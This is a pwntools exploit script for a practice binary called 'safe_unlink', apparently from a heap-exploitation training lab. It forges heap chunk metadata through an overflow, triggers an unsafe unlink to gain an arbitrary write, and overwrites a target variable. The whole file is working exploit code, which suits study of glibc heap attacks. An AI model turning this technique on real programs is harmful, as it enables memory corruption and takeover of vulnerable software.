#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("safe_unlink")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Select the "free" option; send index.
def free(index):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# Request 2 small chunks, the first must be large enought to fit a fake small chunk inside it.
overflow = malloc(0x88)
victim = malloc(0x88)

# Prepare fake chunk metadata.
# A correct size field satisfies the size vs prev_size checks.
fake_chunk_header = p64(0) + p64(0x81)

# Set the fd such that the bk of the "chunk" it points to is the first entry in m_array.
fd = elf.sym.m_array - 0x18

# Set the bk such that the fd of the "chunk" it points to is also the first entry in m_array.
bk = elf.sym.m_array - 0x10

# Set the prev_size field of the next chunk to the actual previous chunk size - 0x10.
prev_size = 0x80

# Write the fake chunk metadata to the "overflow" chunk.
# Overflow into the succeeding chunk's size field to clear the prev_inuse flag.
edit(overflow, fake_chunk_header + p64(fd) + p64(bk) + p8(0)*0x60 + p64(prev_size) + p64(0x90))

# Free the "victim" chunk to trigger backward consolidation with the "overflow" chunk.
free(victim)

# After unlinking, the first entry in m_array points 0x18 bytes before m_array itself.
# Use the "edit" option to overwrite the first entry in m_array again with the address of the target data.
edit(0, b"X"*0x18 + p64(elf.sym.target))

# Use the "edit" option once more to overwrite the target data.
edit(0, b"Much win!")

# Check that the target data was overwritten.
io.sendthen(b"target: ", b"4")
target_data = io.recvuntil(b"\n", True)
assert target_data == b"Much win!"
io.recvuntil(b"> ")

# =============================================================================

io.interactive()
